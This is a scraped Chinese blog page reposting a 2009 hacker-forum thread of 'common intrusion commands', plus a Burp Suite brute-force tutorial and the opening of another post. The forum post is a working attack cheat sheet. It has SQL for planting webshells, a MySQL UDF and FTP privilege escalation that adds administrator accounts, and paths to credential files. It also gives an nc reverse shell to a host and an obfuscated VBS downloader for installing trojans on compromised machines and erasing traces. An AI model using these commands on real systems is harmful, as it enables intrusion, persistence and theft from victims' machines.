<li><a href="http://bbs.hackerxfiles.net/post.php?action=newthread&amp;fid=50&amp;special=1" target="_blank">发布投票</a></li>
<li><a href="http://bbs.hackerxfiles.net/post.php?action=newthread&amp;fid=50&amp;special=3" target="_blank">发布悬赏</a></li>
<li><a href="http://bbs.hackerxfiles.net/post.php?action=newthread&amp;fid=50&amp;special=5" target="_blank">发布辩论</a></li>
<li><a href="http://bbs.hackerxfiles.net/post.php?action=newthread&amp;fid=50&amp;special=4" target="_blank">发布活动</a></li>
<li><a href="http://bbs.hackerxfiles.net/post.php?action=newthread&amp;fid=50&amp;special=6" target="_blank">发布视频</a></li>
<li><p><a href="http://bbs.hackerxfiles.net/post.php?action=newthread&amp;fid=50&amp;special=2" target="_blank">发布商品</a>
<a href="http://bbs.hackerxfiles.net/space.php?uid=159362" target="_blank">孤风月影</a></p>
</li>
<li><p><a href="http://bbs.hackerxfiles.net/pm.php?action=new&amp;uid=159362" title="发短消息" target="_blank">发短消息</a></p>
</li>
<li><a href="http://bbs.hackerxfiles.net/my.php?item=buddylist&amp;newbuddyid=159362&amp;buddysubmit=yes" title="加为好友" target="_blank">加为好友</a></li>
</ul>
<p><a href="http://bbs.hackerxfiles.net/space-uid-159362.html" target="_blank">孤风月影</a> <em>(少年IT精英)**当前离线</em></p>
<p>玩的起继续 玩不起出局 ... ... ...
<a href="http://wpa.qq.com/msgrd?V=1&amp;Uin=287304861&amp;Site=黑客X档案官方论坛&amp;Menu=yes" title="QQ" target="_blank"><img src="" alt="QQ"></a><a href="http://hi.baidu.com/hxs5201314" title="查看个人网站" target="_blank"><img src="" alt="查看个人网站"></a><a href="http://bbs.hackerxfiles.net/space-uid-159362.html" title="查看详细资料" target="_blank"><img src="" alt="查看详细资料"></a>
<a href="http://bbs.hackerxfiles.net/space-uid-159362.html" target="_blank"><img src="" alt=""></a></p>
<p><em>正式版主</em></p>
<p><img src="" alt="Rank: 9"><img src="" alt="Rank: 9"><img src="" alt="Rank: 9"></p>
<p>帖子1385 积分693 威望0 个 金币7207 个 宣传3 个 注册时间2008-1-22 最后登录2009-10-26  <strong><a href="&quot;复制本帖链接&quot;"><em>1</em>楼</a></strong></p>
<p><a href="http://bbs.hackerxfiles.net/viewthread.php?action=printable&amp;tid=381849" target="_blank">打印</a></p>
<p>字体大小: tT</p>
<p><img src="" alt=""> <em>发表于 2009-10-15 17:05</em> | <a href="http://bbs.hackerxfiles.net/viewthread.php?tid=381849&amp;page=1&amp;authorid=159362" target="_blank">只看该作者</a></p>
<p><a href="http://bbs.hackerxfiles.net/goto.php?url=aHR0cDovL3NiYXBzcGwuMzMyMi5vcmcvb2trLmh0bWw=" target="_blank">承接免杀木马业务_出售各类免杀木马</a></p>
<p><a href="http://bbs.hackerxfiles.net/goto.php?url=aHR0cDovL3d3dy53b3JtLXguY29t" target="_blank"><img src="" alt=""></a></p>
<h1 id="-http-bbs-hackerxfiles-net-forumdisplay-php-fid-50-filter-type-typeid-34-"><a href="http://bbs.hackerxfiles.net/forumdisplay.php?fid=50&amp;filter=type&amp;typeid=34" target="_blank">[资料]</a> 一些常用的入侵命令</h1>
<p>load_file()读取文件
—————————————————————————————————
MYSQL注入中，load_file()函数在获得webshell以及提权过程中起着十分重要的作用，常被用来读取各种配置文件，如：
/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件
/usr/local/apache2/conf/httpd.conf
/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置
/usr/local/app/php5/lib/php.ini //PHP相关设置
/etc/sysconfig/iptables //从中得到防火墙规则策略
/etc/httpd/conf/httpd.conf // apache配置文件
/etc/rsyncd.conf //同步程序配置文件
/etc/sysconfig/network-scripts/ifcfg-eth0 //查看IP.
/etc/my.cnf //mysql的配置文件
/etc/redhat-release //系统版本
/etc/issue
/etc/issue.net
c:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码
c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码
c:\Program Files\Serv-U\ServUDaemon.ini
c:\windows\my.ini //MYSQL配置文件
c:\windows\system32\inetsrv\MetaBase.xml //IIS配置文件
等等。实际上，load_file()的作用不止于此，它还可以用来读取系统中的二进制文件，
c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码
c:\Program Files\ Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此
c:\Program Files\RhinoSoft.com\ServUDaemon.exe
C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\/<em>.cif文件
//存储了pcAnywhere的登陆密码
————————————————————————————————————————————————
mssql差异备份webshell
1.备份数据
backup database 库名 to disk = &#39;c:\windows\char.bak&#39;;--
2.创建表并插曲入数据
create table [dbo].[dtest] ([cmd] [image]);
insert into dtest(cmd) values(0x3C25657865637574652872657175657374282261222929253E);--
3.进行差异备份
backup database 库名 to disk=&#39;目标位置\char.asp&#39; WITH DIFFERENTIAL,FORMAT;--
—————————————————————————————————————————————————
phpmyadmin插马
create table a (hack text not null);
insert into a (hack) values (&#39;&lt;?php system($_REQUEST[cmd]);?&gt;&#39;);
select hack from a into outfile &#39;D:/php/www/hack.php&#39;;
drop table a;
phpmyadmin/libraries/select_lang.lib.php
<a href="http://bbs.hackerxfiles.net/goto.php?url=aHR0cDovL3d3dy5oeGhhY2suY29tL2Jicy9pbmRleC5waHA=" target="_blank"><a href="http://bbs.hackerxfiles.net/goto.php?url=aHR0cDovL3d3dy5oeGhhY2suY29tL2Jicy9pbmRleC5waHA=">http://bbs.hackerxfiles.net/goto.php?url=aHR0cDovL3d3dy5oeGhhY2suY29tL2Jicy9pbmRleC5waHA=</a></a>
—————————————————————————————————————————————————
mysql提权
create function cmdshell returns string soname &#39;udf.dll&#39;
select cmdshell(&#39;net user 99990110 17216329 /add&#39;);
select cmdshell(&#39;net localgroup administrators 99990110 /add&#39;);
drop function cmdshell;
—————————————————————————————————————————————————
serv-u修改权限配置
User9=Kindle|1|0
[USER=Kindle|1]
Password=mg5D3A393510FB2F0C04FAA8211509296F 密码:17126329
HomeDir=c:\
RelPaths=1
PasswordLastChange=1239006396
TimeOut=600
Maintenance=System
Access1=C:|RWAMELCDP
—————————————————————————————————————————————————
ftp提权
quote site exec net.exe user Kindle$ 17216329 /add
quote site exec net.exe localgroup administrators Kindle$ /add
regedit /e &quot;C:\Documents and Settings\All Users\Documents\system.ini&quot; &quot;HKEY_LOCAL_MACHINE\SOFTWARE\cat soft\serv-u\&quot;
导入注册表是/s
—————————————————————————————————————————————————
mysql爆表注射
SCHEMA_NAME  information_schema.SCHEMATA
TABLE_NAME   information_schema.TABLES where TABLE_SCHEMA=...
COLUMN_NAME  information_schema.COLUMNS where TABLE_NAME=...
——————————————————————————————————————————————————
cookie注射语句
javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;406 and 1=1&quot;));
——————————————————————————————————————————————————
系统网马后门
copy 1.jpg \.\c:\com1.asp
nc.exe -vv 203.171.230.200 111 -e C:\Downloads\cmd.exe
dir /b /d /s /</em>.exe&gt;c:\1.txt
123&#39;;exec master..xp_cmdshell&#39;net user 213 123 /add&#39;;--
javascript:lbtnUpload.click();
——————————————————————————————————————————————————
命令行下载、运行木马
下文说一下搞定了肉鸡，如何保持长久上线，防止动态ip或者域名变化导致找不到肉鸡。
这需要种植木马，且这个木马要能够往外面咱们自己的服务器或者邮箱等报告自己的运行状态。
如何下载木马并种植到肉鸡上面的问题，其实网上也有零散的，我这儿算是整理，同时加上自己的体会。大家还是多实践，多搞搞肉鸡(最好练习命令行，3389登陆上去一对记录，如被追踪很危险的。其实我更相信，图形界面下能操作的，命令行都能操作正如windows下能搞的，linux下都能做到)这儿命令行可以是ms sql1433得到的xp_cmdshell等。
木马下载无非是ftp跟http的网页下载两种方式，这儿分别介绍：
1.ftp下载
这儿是使用肉鸡system32目录下的ftp.exe来访问我们放置木马的ftp服务。
显然要解决输入帐号密码的问题，同时要制定命令让远程的ftp.exe执行，从而下载文件。还好，这些都可以通过命令来解决。
假设木马文件在服务器ftpxx.3322.org下，帐号为ftpxx,密码为3322，文件为mm.exe。</p>
<h1 id="-">通过命令行</h1>
<p>echo ftpxxx&gt;ftp.txt
echo 3322&gt;&gt;ftp.txt
echo get mm.exe&gt;&gt;ftp.txt
echo bye&gt;&gt;ftp.txt</p>
<h1 id="ftp-s-ftp-txt-ftpxx-3322-org">ftp -s:ftp.txt ftpxx.3322.org</h1>
<p>则根据前一篇文章的&amp;用法，也可以用一句命令完成：
echo ftpxxx&gt;ftp.txt &amp; echo 3322&gt;&gt;ftp.txt &amp; echo get mm.exe&gt;&gt;ftp.txt &amp; echo bye&gt;&gt;ftp.txt &amp; ftp -s:ftp.txt ftpxx.3322.org
这样就下载成功了。
下一步是执行木马并删除记录：
也就是一句话(三个语句):
mm.exe &amp; del ftp.txt &amp; del mm.exe
2.html下载
这儿是使用肉鸡system32目录下的wscript.exe来执行指定的vbs脚本访问我们放置木马的http服务器。
假设木马地址为:<a href="http://bbs.hackerxfiles.net/goto.php?url=aHR0cDovL2Z0cHh4LjMzMjIub3JnL21tLmV4ZQ==" target="_blank"><a href="http://bbs.hackerxfiles.net/goto.php?url=aHR0cDovL2Z0cHh4LjMzMjIub3JnL21tLmV4ZQ==">http://bbs.hackerxfiles.net/goto.php?url=aHR0cDovL2Z0cHh4LjMzMjIub3JnL21tLmV4ZQ==</a></a> mm.exe
通过命令行(无需任何修改，我已做免杀，除非被杀了，可以修改脚本)
＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝
@echo with wscript:if .arguments.count^<2-0+0-0+0 then .quit:end if > thisis.vbs
@echo set aso=.createobject(&quot;adodb.stream&quot;):set thisisweb=createobject(&quot;mi&quot;+&quot;cr&quot;+&quot;o&quot;+&quot;s&quot;+&quot;o&quot;+&quot;ft.x&quot;+&quot;ml&quot;+&quot;h&quot;+&quot;ttp&quot;) &gt;&gt; thisis.vbs
@echo thisisweb.open &quot;g&quot;+&quot;e&quot;+&quot;t&quot;,.arguments(0),0:thisisweb.send:if thisisweb.status^&gt;200 then .echo &quot;E&quot;+&quot;r&quot;+&quot;r&quot;+&quot;o&quot;+&quot;r&quot;+&quot;:&quot;+thisisweb.status:.quit&gt;&gt; thisis.vbs
@echo aso.type=1-0+0-0+0:aso.open:aso.write thisisweb.responsebody:aso.savetofile .arguments(1-0+0-0+0),2-0+0-0+0:end with &gt;&gt; thisis.vbs
Type thisis.vbs
＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝
下一步是执行木马并删除记录：
也就是一句话(三个语句):
cscript thisis.vbs <a href="http://bbs.hackerxfiles.net/goto.php?url=aHR0cDovL2Z0cHh4LjMzMjIub3JnL21tLmV4ZQ==" target="_blank"><a href="http://bbs.hackerxfiles.net/goto.php?url=aHR0cDovL2Z0cHh4LjMzMjIub3JnL21tLmV4ZQ==">http://bbs.hackerxfiles.net/goto.php?url=aHR0cDovL2Z0cHh4LjMzMjIub3JnL21tLmV4ZQ==</a></a> mm.exe &amp; del thisis.vbs &amp; del mm.exe
或者简单的方法是(会弹出网页!):
START its:<a href="http://bbs.hackerxfiles.net/goto.php?url=aHR0cDovL2Z0cHh4LjMzMjIub3JnL21tLmV4ZQ==" target="_blank"><a href="http://bbs.hackerxfiles.net/goto.php?url=aHR0cDovL2Z0cHh4LjMzMjIub3JnL21tLmV4ZQ==">http://bbs.hackerxfiles.net/goto.php?url=aHR0cDovL2Z0cHh4LjMzMjIub3JnL21tLmV4ZQ==</a></a>
下载后，
DIR /A /S &quot;C:\Documents and Settings\Default User\Local Settings\Temporary Internet Files\Content.IE5\/*.EXE&quot;
列出路径后，执行。
       这儿帐号Default User也可能是当前用户
<a href="http://bbs.hackerxfiles.net/logging.php?action=login" target="_blank">收藏</a> <a href="http://bbs.hackerxfiles.net/misc.php?action=emailfriend&amp;tid=381849" target="_blank">分享</a> <a href="http://bbs.hackerxfiles.net/logging.php?action=login" target="_blank">评分</a>
<a href="http://bbs.hackerxfiles.net/goto.php?url=aHR0cDovL2hpLmJhaWR1LmNvbS9oeHM1MjAxMzE0" target="_blank">我的baidu空间</a></p>
<p><a href="http://bbs.hackerxfiles.net/goto.php?url=aHR0cDovL3NiYXBzcGwuMzMyMi5vcmcvb2trLmh0bWw=" target="_blank">承接免杀木马业务_出售各类免杀木马</a> <em><a href="http://bbs.hackerxfiles.net/post.php?action=reply&amp;fid=50&amp;tid=381849&amp;reppost=1407413&amp;extra=page%3D1&amp;page=1" target="_blank">回复</a> <a href="http://bbs.hackerxfiles.net/post.php?action=reply&amp;fid=50&amp;tid=381849&amp;repquote=1407413&amp;extra=page%3D1&amp;page=1" target="_blank">引用</a></em></p>
<p><a href="http://bbs.hackerxfiles.net/my.php?item=subscriptions&amp;subadd=381849" target="_blank">订阅</a> <a href="">TOP</a></p>
<p><a href="http://bbs.hackerxfiles.net/space.php?uid=234482" target="_blank">561726469</a></p>
<ul>
<li><a href="http://bbs.hackerxfiles.net/pm.php?action=new&amp;uid=234482" title="发短消息" target="_blank">发短消息</a></li>
<li><a href="http://bbs.hackerxfiles.net/my.php?item=buddylist&amp;newbuddyid=234482&amp;buddysubmit=yes" title="加为好友" target="_blank">加为好友</a></li>
</ul>
<p><a href="http://bbs.hackerxfiles.net/space-uid-234482.html" target="_blank">561726469</a> <em>当前离线</em>
<a href="http://www.yangfangyi.qyun.net/" title="查看个人网站" target="_blank"><img src="" alt="查看个人网站"></a><a href="http://bbs.hackerxfiles.net/space-uid-234482.html" title="查看详细资料" target="_blank"><img src="" alt="查看详细资料"></a>
<a href="http://bbs.hackerxfiles.net/space-uid-234482.html" target="_blank"><img src="" alt=""></a></p>
<p><em>一年级</em></p>
<p><img src="" alt="Rank: 1"></p>
<p>帖子369 积分185 威望0 个 金币679 个 宣传1 个 注册时间2009-1-17 最后登录2009-10-25  <strong><a href="&quot;复制本帖链接&quot;"><em>2</em>楼</a></strong></p>
<p><img src="" alt=""> <em>发表于 2009-10-15 18:46</em> | <a href="http://bbs.hackerxfiles.net/viewthread.php?tid=381849&amp;page=1&amp;authorid=234482" target="_blank">只看该作者</a></p>
<p>顶顶啊! <em><a href="http://bbs.hackerxfiles.net/post.php?action=reply&amp;fid=50&amp;tid=381849&amp;reppost=1407501&amp;extra=page%3D1&amp;page=1" target="_blank">回复</a> <a href="http://bbs.hackerxfiles.net/post.php?action=reply&amp;fid=50&amp;tid=381849&amp;repquote=1407501&amp;extra=page%3D1&amp;page=1" target="_blank">引用</a></em></p>
<p><a href="">TOP</a>
<a href="http://bbs.hackerxfiles.net/space.php?uid=283093" target="_blank">ywxiaozi</a></p>
<ul>
<li><a href="http://bbs.hackerxfiles.net/pm.php?action=new&amp;uid=283093" title="发短消息" target="_blank">发短消息</a></li>
<li><a href="http://bbs.hackerxfiles.net/my.php?item=buddylist&amp;newbuddyid=283093&amp;buddysubmit=yes" title="加为好友" target="_blank">加为好友</a></li>
</ul>
<p><a href="http://bbs.hackerxfiles.net/space-uid-283093.html" target="_blank">ywxiaozi</a> <em>当前离线</em>
<a href="http://bbs.hackerxfiles.net/space-uid-283093.html" title="查看详细资料" target="_blank"><img src="" alt="查看详细资料"></a>
<a href="http://bbs.hackerxfiles.net/space-uid-283093.html" target="_blank"><img src="" alt=""></a></p>
<p><em>学前班</em></p>
<p>帖子22 积分11 威望0 个 金币34 个 宣传3 个 注册时间2009-8-1 最后登录2009-10-18  <strong><a href="&quot;复制本帖链接&quot;"><em>3</em>楼</a></strong></p>
<p><img src="" alt=""> <em>发表于 2009-10-18 14:36</em> | <a href="http://bbs.hackerxfiles.net/viewthread.php?tid=381849&amp;page=1&amp;authorid=283093" target="_blank">只看该作者</a></p>
<p>ding 顶顶  顶
喜欢简单 <em><a href="http://bbs.hackerxfiles.net/post.php?action=reply&amp;fid=50&amp;tid=381849&amp;reppost=1409607&amp;extra=page%3D1&amp;page=1" target="_blank">回复</a> <a href="http://bbs.hackerxfiles.net/post.php?action=reply&amp;fid=50&amp;tid=381849&amp;repquote=1409607&amp;extra=page%3D1&amp;page=1" target="_blank">引用</a></em></p>
<p><a href="">TOP</a></p>
<p><a href="http://bbs.hackerxfiles.net/space.php?uid=298086" target="_blank">kfchina</a></p>
<ul>
<li><a href="http://bbs.hackerxfiles.net/pm.php?action=new&amp;uid=298086" title="发短消息" target="_blank">发短消息</a></li>
<li><a href="http://bbs.hackerxfiles.net/my.php?item=buddylist&amp;newbuddyid=298086&amp;buddysubmit=yes" title="加为好友" target="_blank">加为好友</a></li>
</ul>
<p><a href="http://bbs.hackerxfiles.net/space-uid-298086.html" target="_blank">kfchina</a> <em>当前离线</em>
<a href="http://bbs.hackerxfiles.net/space-uid-298086.html" title="查看详细资料" target="_blank"><img src="" alt="查看详细资料"></a>
<a href="http://bbs.hackerxfiles.net/space-uid-298086.html" target="_blank"><img src="" alt=""></a></p>
<p><em>学前班</em></p>
<p>帖子23 积分12 威望0 个 金币53 个 宣传0 个 注册时间2009-9-30 最后登录2009-10-19  <strong><a href="&quot;复制本帖链接&quot;"><em>4</em>楼</a></strong></p>
<p><img src="" alt=""> <em>发表于 2009-10-19 22:50</em> | <a href="http://bbs.hackerxfiles.net/viewthread.php?tid=381849&amp;page=1&amp;authorid=298086" target="_blank">只看该作者</a></p>
<p><img src="" alt="">好多，眼睛都看花了 <em><a href="http://bbs.hackerxfiles.net/post.php?action=reply&amp;fid=50&amp;tid=381849&amp;reppost=1410688&amp;extra=page%3D1&amp;page=1" target="_blank">回复</a> <a href="http://bbs.hackerxfiles.net/post.php?action=reply&amp;fid=50&amp;tid=381849&amp;repquote=1410688&amp;extra=page%3D1&amp;page=1" target="_blank">引用</a></em></p>
<p><a href="">TOP</a>
<a href="http://bbs.hackerxfiles.net/space.php?uid=304671" target="_blank">zkl_1987</a></p>
<ul>
<li><a href="http://bbs.hackerxfiles.net/pm.php?action=new&amp;uid=304671" title="发短消息" target="_blank">发短消息</a></li>
<li><a href="http://bbs.hackerxfiles.net/my.php?item=buddylist&amp;newbuddyid=304671&amp;buddysubmit=yes" title="加为好友" target="_blank">加为好友</a></li>
</ul>
<p><a href="http://bbs.hackerxfiles.net/space-uid-304671.html" target="_blank">zkl_1987</a> <em>当前离线</em>
<a href="http://bbs.hackerxfiles.net/space-uid-304671.html" title="查看详细资料" target="_blank"><img src="" alt="查看详细资料"></a>
<a href="http://bbs.hackerxfiles.net/space-uid-304671.html" target="_blank"><img src="" alt=""></a></p>
<p><em>一年级</em></p>
<p><img src="" alt="Rank: 1"></p>
<p>帖子104 积分52 威望0 个 金币296 个 宣传1 个 注册时间2009-10-23 最后登录2009-10-28  <strong><a href="&quot;复制本帖链接&quot;"><em>5</em>楼</a></strong></p>
<p><img src="" alt=""> <em>发表于 昨天 10:42</em> | <a href="http://bbs.hackerxfiles.net/viewthread.php?tid=381849&amp;page=1&amp;authorid=304671" target="_blank">只看该作者</a></p>
<p>谢谢分享…… <em><a href="http://bbs.hackerxfiles.net/post.php?action=reply&amp;fid=50&amp;tid=381849&amp;reppost=1416836&amp;extra=page%3D1&amp;page=1" target="_blank">回复</a> <a href="http://bbs.hackerxfiles.net/post.php?action=reply&amp;fid=50&amp;tid=381849&amp;repquote=1416836&amp;extra=page%3D1&amp;page=1" target="_blank">引用</a></em></p>
<p><a href="">TOP</a></p>
<p><a href="http://bbs.hackerxfiles.net/space.php?uid=40077" target="_blank">lxjlxj8</a></p>
<ul>
<li><a href="http://bbs.hackerxfiles.net/pm.php?action=new&amp;uid=40077" title="发短消息" target="_blank">发短消息</a></li>
<li><a href="http://bbs.hackerxfiles.net/my.php?item=buddylist&amp;newbuddyid=40077&amp;buddysubmit=yes" title="加为好友" target="_blank">加为好友</a></li>
</ul>
<p><a href="http://bbs.hackerxfiles.net/space-uid-40077.html" target="_blank">lxjlxj8</a> <em>当前在线</em>
<a href="http://bbs.hackerxfiles.net/space-uid-40077.html" title="查看详细资料" target="_blank"><img src="" alt="查看详细资料"></a>
<a href=""></a><a href=""></a></p>
<p><a href="http://bbs.hackerxfiles.net/space-uid-40077.html" target="_blank"><img src="" alt=""></a></p>
<p><em>学前班</em></p>
<p>帖子2 积分1 威望0 个 金币85 个 宣传0 个 注册时间2007-2-9 最后登录2009-10-28  <strong><a href="&quot;复制本帖链接&quot;"><em>6</em>楼</a></strong></p>
<p><img src="" alt=""> <em>发表于 2 小时前</em> | <a href="http://bbs.hackerxfiles.net/viewthread.php?tid=381849&amp;page=1&amp;authorid=40077" target="_blank">只看该作者</a></p>
<p>好东西支持 <em><a href="http://bbs.hackerxfiles.net/post.php?action=reply&amp;fid=50&amp;tid=381849&amp;reppost=1417625&amp;extra=page%3D1&amp;page=1" target="_blank">回复</a> <a href="http://bbs.hackerxfiles.net/post.php?action=reply&amp;fid=50&amp;tid=381849&amp;repquote=1417625&amp;extra=page%3D1&amp;page=1" target="_blank">引用</a></em></p>
<p><a href="">TOP</a></p>
<p><a href="http://bbs.hackerxfiles.net/forum-50-1.html" target="_blank">返回列表</a>
<a href="http://bbs.hackerxfiles.net/?gid=47" target="_blank">论坛特区</a></p>
<ul>
<li><a href="http://bbs.hackerxfiles.net/forum-44-1.html" target="_blank">【新生报到】</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-31-1.html" target="_blank">【原创发布】</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-25-1.html" target="_blank">【骇客新闻】</a> <a href="http://bbs.hackerxfiles.net/?gid=4" target="_blank">杂志相关</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-19-1.html" target="_blank">【新书发布】</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-39-1.html" target="_blank">【杂志事务】</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-14-1.html" target="_blank">【稿费样刊】</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-20-1.html" target="_blank">【杂志工具】</a> <a href="http://bbs.hackerxfiles.net/?gid=1" target="_blank">技术讨论</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-5-1.html" target="_blank">【小菜举手】</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-48-1.html" target="_blank">【攻防技术】</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-13-1.html" target="_blank">【编程魔方】</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-29-1.html" target="_blank">【毒木成林】</a> <a href="http://bbs.hackerxfiles.net/?gid=28" target="_blank">资料发布</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-49-1.html" target="_blank">【资料审核】</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-42-1.html" target="_blank">【QQ 攻防】</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-16-1.html" target="_blank">【农具店铺】</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-43-1.html" target="_blank">【动画教程】</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-50-1.html" target="_blank">【黑客资料】</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-21-1.html" target="_blank">【资源共享】</a> <a href="http://bbs.hackerxfiles.net/?gid=3" target="_blank">休闲娱乐</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-6-1.html" target="_blank">【寂寞梧桐】</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-26-1.html" target="_blank">【笔墨江湖】</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-24-1.html" target="_blank">【影音梧桐】</a> <a href="http://bbs.hackerxfiles.net/?gid=9" target="_blank">论坛站务</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-46-1.html" target="_blank">【官方公告】</a></li>
<li><a href="http://bbs.hackerxfiles.net/forum-10-1.html" target="_blank">【申请意见】</a></li>
</ul>
<p><a href="http://www.miibeian.gov.cn/" target="_blank">京ICP备05044370号</a>|<a href="http://bbs.hackerxfiles.net/archiver/" target="_blank">Archiver</a>|<a href="http://bbs.hackerxfiles.net/sitemap_index.xml" target="_blank">SiteMap</a> |<a href="http://bbs.hackerxfiles.net/wap/" target="_blank">WAP</a>|  <a href="http://www.linezing.com/" target="_blank"><img src="" alt=""></a></p>
<p>GMT+8, 2009-10-28 11:17, Processed in 0.020896 second(s), 4 queries, Gzip enabled.</p>
<p>Powered by <strong>Discuz!</strong> <em>7.0.0</em> © 2001-2009</p>
<p>Designed by <a href="http://54abu.cn/" target="_blank">54Abu.Cn</a></p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span><span class="breadcrumb"><li><a href="/categories/安全/">安全</a></li><li><a href="/categories/安全/X/">X</a></li></span></span> | <span class="tags">Tagged <a href="/tags/X/" class="label label-primary">X</a><a href="/tags/安全/" class="label label-success">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:39"datetime="2014-03-07 09:54:39"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全-X--一些常用的入侵命令-【黑客资料】/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全-X--一些常用的入侵命令-【黑客资料】" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全--Burpsuite教程与技巧之HTTPbrute暴力破解/">Burpsuite教程与技巧之HTTP brute暴力破解</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-安全--Burpsuite教程与技巧之HTTPbrute暴力破解/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="burpsuite-http-brute-">Burpsuite教程与技巧之HTTP brute暴力破解</h1>
<h3 id="burpsuite-http-brute-">Burpsuite教程与技巧之HTTP brute暴力破解</h3>
<p><a href="http://www.freebuf.com/articles/web/7457.html#" target="_blank"></a><a href="http://www.freebuf.com/author/gall" title="由 Gall 发布">Gall</a> @ <a href="http://www.freebuf.com/category/articles/web" title="查看 WEB安全 中的全部文章" target="_blank">WEB安全</a> 2013-02-28 共 <strong>5644</strong> 人围观</p>
<p>感谢<a href="http://www.freebuf.com/author/gall" target="_blank">Gall</a>投递</p>
<p><strong>常规的对username/passwprd进行payload测试，我想大家应该没有什么问题，但**</strong>对于Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=这样的问题，很多朋友疑惑了.**</p>
<p>之前，我记得我介绍过burpsuite的intruder功能(<a href="http://www.freebuf.com/articles/5560.html" target="_blank">BurpSuite教程与技巧之SQL Injection</a>)，想必很多人没什么印象，在此，以HTTP brute重提intruder功能.</p>
<p>以下面案例进行说明(只作演示之用，具体以自己的目标为准)</p>
<p><img src="" alt=""></p>
<p>Auth=dXNlcjpwYXNzd29yZA==处，也就是我们的关键位置.</p>
<p>那么具体该如何做呢?大致操作过程如下:</p>
<p>1.解密base64字符串2.生成测试用的payload3.利用payload进行测试</p>
<p><strong>1.解密验证用的base64字符串</strong></p>
<p><img src="" alt=""></p>
<p>解密后的字符串为:</p>
<p>Auth=user:password</p>
<p>问题来了，针对user:password这种形式的字符串，我们该如何设置payload呢?</p>
<p>想必很多人在此处了费尽心思。为了解决这个问题，接下来请看第二部分。</p>
<p><strong>2.生成测试用的payload</strong></p>
<p>对于这种格式，无法利用burpsuite顺利的完成测试，那个就需要丰富对应的payload了.</p>
<p>我的做法就是，利用burpsuite生成我要的payload文本.</p>
<p>Auth=§user§§:§§password§</p>
<p>设置3处payloads，</p>
<p>1 ------ §user§2 ------ §:§3 ------ §password§</p>
<p>然后根据intruder自带的battering ram/pitchfork/cluster bomb生成payloads(根据自己的需求生成)</p>
<p>我在此处选择以cluster bomb为例，利用intruder生成需要的payloads，然后保存到文本文件中.</p>
<p><img src="" alt=""></p>
<p><img src="" alt=""></p>
<p><strong>3.利用payload进行测试</strong></p>
<p>测试的时候，我们选用sniper，我们只需一个payload变量</p>
<p><img src="" alt=""></p>
<p><img src="" alt=""></p>
<p><img src="" alt=""></p>
<p>若有不足之处，欢迎指正.</p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span></span> | <span class="tags">Tagged <a href="/tags/安全/" class="label label-primary">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:38"datetime="2014-03-07 09:54:38"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全--Burpsuite教程与技巧之HTTPbrute暴力破解/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全--Burpsuite教程与技巧之HTTPbrute暴力破解" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全--企业秘密保护与陷阱网络10/">企业秘密保护与陷阱网络1.0</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-安全--企业秘密保护与陷阱网络10/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="-1-0">企业秘密保护与陷阱网络1.0</h1>
<p><img src="" alt=""> <img src="" alt=""> <img src="" alt=""> 企业秘密保护与陷阱网络
